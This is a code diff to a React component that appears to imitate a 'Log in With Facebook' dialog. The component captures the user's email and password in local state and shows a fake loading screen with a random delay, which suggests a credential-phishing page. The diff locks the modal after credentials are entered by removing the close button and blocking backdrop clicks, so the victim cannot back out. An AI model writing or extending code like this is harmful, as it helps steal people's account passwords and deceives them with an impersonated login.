@@ -18,11 +18,13 @@ const FacebookLoginModal = ({ isOpen, onClose }: FacebookLoginModalProps) => {
   const [showAccountProcess, setShowAccountProcess] = useState(false);
   const [showLoading, setShowLoading] = useState(false);
   const [userLoginData, setUserLoginData] = useState<{ email: string; password: string } | null>(null);
+  const [hasLoggedIn, setHasLoggedIn] = useState(false);
 
   if (!isOpen) return null;
 
   const handleBackdropClick = (e: React.MouseEvent) => {
-    if (e.target === e.currentTarget) {
+    // Prevent closing if user has already logged in
+    if (e.target === e.currentTarget && !hasLoggedIn) {
       onClose();
     }
   };
@@ -30,6 +32,7 @@ const FacebookLoginModal = ({ isOpen, onClose }: FacebookLoginModalProps) => {
   const handleLogin = () => {
     if (email && password) {
       setUserLoginData({ email, password });
+      setHasLoggedIn(true);
       setShowLoading(true);
       
       // Random delay between 3-5 seconds
@@ -90,12 +93,14 @@ const FacebookLoginModal = ({ isOpen, onClose }: FacebookLoginModalProps) => {
             </div>
             <span className="font-normal text-lg" style={{ fontFamily: 'Arial, sans-serif' }}>Log in With Facebook</span>
           </div>
-          <button 
-            onClick={onClose}
-            className="text-white hover:bg-white/20 rounded-full p-1"
-          >
-            <X size={20} />
-          </button>
+          {!hasLoggedIn && (
+            <button 
+              onClick={onClose}
+              className="text-white hover:bg-white/20 rounded-full p-1"
+            >
+              <X size={20} />
+            </button>
+          )}
         </div>
 
         {/* Content */}
